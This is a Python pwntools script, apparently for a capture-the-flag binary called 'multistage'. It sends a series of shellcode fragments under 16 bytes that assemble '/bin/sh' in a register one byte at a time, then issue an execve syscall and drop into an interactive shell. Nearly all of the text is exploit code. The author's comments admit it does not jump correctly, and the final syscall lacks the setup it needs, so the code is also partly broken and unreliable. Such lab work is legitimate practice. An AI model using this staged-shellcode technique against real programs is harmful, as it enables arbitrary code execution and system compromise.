# S: Try to jump to before the shellcode is read to set up multistage.
# Q: Why doen't it jump in the correct memory address (no PIE, no ASLR)?

from pwn import *
from time import sleep

elf = ELF('./multistage')
context.arch = 'amd64'
# context.terminal = ['alacritty', '-e', 'sh', '-c']
# context.terminal = ['konsole', '-e', 'sh', '-c']
context.terminal = ['konsole', '-e']

if 'GDB' in os.environ:
    print('DEBUG MODE')
    p = gdb.debug('./multistage', gdbscript='''
    b *0x0040123b
    c
    ''')
else:
    p = elf.process()

# mov rdi, 0x0068732f6e69622f
0x68732f0e69622f
# mov edi, 0xe69622f
# push rdi
# mov rax, 0x{(elf.address + 0x00401196):x}

def send(sh):
    log.info(f'shellcode: {sh}')
    l = len(asm(sh))

    if l >= 16:
        raise Exception(f'Shellcode too big:\n{sh}\nlen: {l}\n')

    log.info(f'shellcode len: {l}')
    log.info(p.clean())
    p.sendline(asm(sh))

def write(byt, wait=False):
    send(f'''
    or r15, {byt}
    mov rax, 0x00401196
    jmp rax
    ''')
    if wait: input('Waiting...')

    send(f'''
    shl r15, 8
    mov rax, 0x00401196
    jmp rax
    ''')
    if wait: input('Waiting...')

# NB. /bin/sh: 0x0068732f6e69622f

# /bin/sh: Fill bottom 32-bit.
send(f'''
mov r15d, 0x0068732f
mov rax, 0x00401196
jmp rax
''')
input('Waiting...')

# /bin/sh: Shift them left.
send(f'''
shl r15, 8
mov rax, 0x00401196
jmp rax
''')
input('Waiting...')

write('0x6e', wait=True)
write('0x69', wait=True)
write('0x62', wait=True)
write('0x2f', wait=True)

send(f'''
xor rax, rax
mov al, 0x3b
syscall
''')

p.interactive()